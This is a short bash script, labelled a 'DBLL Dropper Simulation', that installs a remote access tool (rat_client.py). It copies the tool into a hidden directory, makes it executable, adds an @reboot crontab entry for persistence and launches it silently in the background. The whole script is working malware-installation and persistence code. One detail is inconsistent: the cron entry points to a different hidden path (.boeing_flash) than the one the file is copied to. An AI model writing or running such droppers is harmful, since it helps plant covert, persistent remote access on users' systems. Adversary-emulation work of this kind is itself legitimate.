#!/bin/bash
echo "[*] Running DBLL Dropper Simulation"

mkdir -p ~/.local/.hidden
cp rat_client.py ~/.local/.hidden/rat_client.py
chmod +x ~/.local/.hidden/rat_client.py

# Setup persistence - (simulate LNK persistence)
(crontab -l 2>/dev/null; echo "@reboot python3 ~/.local/.boeing_flash/rat_client.py &") | crontab -

# Start RAT
nohup python3 ~/.local/.hidden/rat_client.py >/dev/null 2>&1 &
echo "[*] Dropper installed RAT and set persistence"

